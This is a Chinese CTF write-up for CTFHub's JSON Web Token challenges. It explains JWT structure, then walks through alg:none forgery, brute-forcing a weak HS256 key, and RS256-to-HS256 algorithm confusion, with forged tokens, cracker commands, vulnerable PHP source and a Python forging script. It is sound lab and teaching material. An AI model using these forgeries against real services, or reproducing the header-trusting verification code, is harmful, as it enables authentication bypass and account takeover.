# CTFHUB
- [Web](#Web)
    - [Web进阶](#Web进阶)
        - [PHP](#PHP)
            - [Bypass disable_function](#Bypass-disable_function)
        - [JSON Web Token](#JSON_Web_Token)
            - [基础知识](#基础知识)
                - [敏感信息泄露](#敏感信息泄露)
                - [重签名](#重签名)
                    - [无签名](#无签名)
                    - [弱密钥](#弱密钥)
                    - [修改签名算法](#修改签名算法)




## Web
## Web进阶
### PHP

### JSON_Web_Token
### 基础知识

**JWT是什么**

JWT全称:Json Web Token,一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。

**为什么使用JWT**

session认证信息要记录在服务端。通常保存在内存，用户增多开销增大。分布式情况下影响负载均衡和应用扩展。

基于token的认证机制类似http协议是无状态的。不需要再服务端保留用户的认证信息。所以应用不需要考虑用户在那一台服务器登录，有利于应用扩展。

**JWT原理**

服务器认证后，会生成一个JSON对象发给用户，格式如下：

```

{
  "姓名": "张三",
  "角色": "管理员",
  "到期时间": "2018年7月1日0点0分"
}
```

之后，用户与服务器通信时都会发送这个JSON对象，服务器只靠这个JSON对象认证用户身份。为了防止用户篡改数据，服务器在生成对象时，会加上签名。

服务器不保存任何Session数据，也就是说服务器变成无状态了，从而比较容易实现扩展。

**JWT数据结构**

![](./img/jwt1.png)

``eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ``

它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里是为了便于展示。

JWT分为三个部分：
- Header 头部
- Payload 负载
- Signature 签名

连起来一行是 ``Header.Payload.Signature``

最后每个部分都进行base64编码

![](./img/jwt2.png)

**Header**
Header 部分是一个 JSON 对象，描述 JWT 的元数据,通常字符串如下:

``eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`` base64解码后如下:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
`alg`属性表示签名的算法(algorithm),默认是HMAC SHA256(这里写成HS256),`typ`属性表示这个令牌(token)的类型(type),JWT令牌统一写成JWT。之后就是简单的base64编码了。

**Payload**
Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。

- iss(issuer) : 签发人
- exp(expiration time) : 过期时间
- sub(subject) : 主题
- aud(audience) :  受众
- nbf(Not Before) ：生效时间
- iat(Issued At) ：签发时间
- jti(JWT ID) ：编号

除了官方字段，还可以在这个部分定义私有字段，以上面的例子为例，将 payload 部分解 base64 之后

```
{
  "sub": "1234567890",
  "name": "CTFHub",
  "iat": 1516239022
}
```
注意:JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分

**Signature**

Signature 部分是对前两部分的签名，防止数据篡改

首先需要指定一个密钥(secret)。这个密钥只有服务器知道，不能泄露给用户。使用Header里面指定的签名算法,默认是HMAC SHA256，按照下列公式产生签名。

```json
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。

**参考链接**

https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html


### 敏感信息泄露

**题目描述**

JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}

**解题思路**

![](./img/jwt4.png)
![](./img/jwt3.png)

### 无签名

**题目描述**

一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。

**解题思路**

首先登录抓包，将response回应的token解码，修改如下，alg:none,role:admin

![](./img/jwt6.png)

token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.

- 最后要加个点号，签名为空，post请求index.php

![](./img/jwt5.png)


### 弱密钥
- 国外在线JWT加密解密网站 - https://jwt.io/

**题目描述**

```
如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag
```

**解题思路**

[jwt-cracker工具](https://github.com/brendan-rius/c-jwt-cracker)

```bash
proxychains4 git clone https://github.com/brendan-rius/c-jwt-cracker
cd c-jwt-cracker
docker build . -t jwtcrack
docker run -it --rm  jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.JbQCbDcXdBM4yzeuGcCUKzEquLJcLx_s_Lsqv9lycnw
```

![](./img/jwt7.png)

密钥为igvt


![](./img/jwt8.png)
![](./img/jwt9.png)


### 修改签名算法

**题目描述**

```
有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。 
```

**题目源码**
```php
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>CTFHub JWTDemo</title>
        <link rel="stylesheet" href="/static/style.css" />
    </head>
    <body>
        <main id="content">
            <header>Web Login</header>
            <form id="login-form" method="POST">
                <input type="text" name="username" placeholder="Username" />
                <input type="password" name="password" placeholder="Password" />
                <input type="submit" name="action" value="Login" />
            </form>
            <a href="/publickey.pem">publickey.pem</a>
        </main>
        <?php echo $_COOKIE['token'];?>
        <hr/>
    </body>
</html>

<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```

**解题思路**

将publickey.pem下载到本地

```py
import jwt
key = open('publickey.pem','r').read()
data = {"username":"admin","password":"123456","role":"admin"}
print(jwt.encode(data, key=key, algorithm='HS256'))
```



- 这里会报错，需要将algorithms.py第150行的一段如下注释掉。

```py
if any([string_value in key for string_value in invalid_strings]):
            raise InvalidKeyError(
                'The specified key is an asymmetric key or x509 certificate and'
                ' should not be used as an HMAC secret.')
```

```bash
pip3 install pyjwt
python3 hs256.py
```

![](./img/jwt10.png)

**Resources**
- [非对称加密流程原理](https://www.jianshu.com/p/d0a89c18f1f7?utm_campaign)
- [RS256->HS256](http://www.ghtwf01.cn/index.php/archives/1108/#menu_index_9)
